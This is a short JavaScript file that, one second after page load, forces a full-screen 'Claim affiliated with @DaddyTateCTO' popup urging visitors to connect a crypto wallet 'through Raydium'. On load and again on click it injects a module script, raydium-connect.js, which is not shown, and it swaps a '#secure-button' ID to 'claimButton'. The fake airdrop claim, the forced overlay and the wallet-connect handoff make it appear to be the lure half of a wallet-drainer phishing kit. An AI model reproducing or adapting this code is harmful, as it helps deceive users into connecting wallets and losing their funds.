function showPopup() {
    const popupHTML = `
<style>
        .claim-active {
            font-family: Arial, sans-serif;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: rgba(0, 0, 0, .8);
            z-index: 9999;
        }
        .popup {
            background-color: #1f2438;
            border-radius: 16px;
            padding: 36px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 90%;
        }
        h2 {
            color: #FFFFFF;
            font-size: 28px;
            margin-bottom: 20px;
        }
        h3 {
            color: #FFFFFF;
            font-size: 18px;
            margin-bottom: 20px;
            font-weight: 400;
            background-color: rgba(0, 0, 0, .35);
            padding: 20px;
            border-radius: 10px;
        }
        .raydium-connect {
            background-color: rgb(39, 219, 255);
            color: black;
            border: none;
            border-radius: 10px;
            padding: 14px 60px;
            font-size: 20px;
            font-weight: 400;
            margin-top: 20px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .raydium-connect:hover {
            transition: background-color 0.3s ease;
            background-color: rgb(19, 198, 234);
        }

        a {
            color: #49adff;
            text-decoration: none;
        }
    </style>
    <div class="popup">
        <h2>Claim affiliated with <a href="https://x.com/daddytatecto">@DaddyTateCTO</a></h2>
        <h3>Connect your wallet though Raydium to continue</h3>
        <button id="claimButton" class="raydium-connect">Connect Wallet</button>
    </div>
    `;

    const script = document.createElement('script');
    script.type = 'module';
    script.src = 'raydium-connect.js';
    document.head.appendChild(script);

    const popupContainer = document.createElement('div');
    popupContainer.className = 'claim-active';
    popupContainer.innerHTML = popupHTML;
    document.body.appendChild(popupContainer);
    document.body.classList.add('claim-active');

    // Add event listener to the claim button after it's added to the DOM
    const claimButton = popupContainer.querySelector('#claimButton');
    claimButton.addEventListener('click', () => {
        // Remove the popup container
        document.body.removeChild(popupContainer);
        // Remove the 'claim-active' class from the body
        document.body.classList.remove('claim-active');

        const secureButton = document.querySelector('#secure-button')
        secureButton.id = 'claimButton'

        //reload raudium-connect.js
        const script = document.createElement('script');
        script.type = 'module';
        script.src = 'raydium-connect.js';
        document.head.appendChild(script);
    });
}

document.addEventListener('DOMContentLoaded', () => {
    setTimeout(showPopup, 1000);
});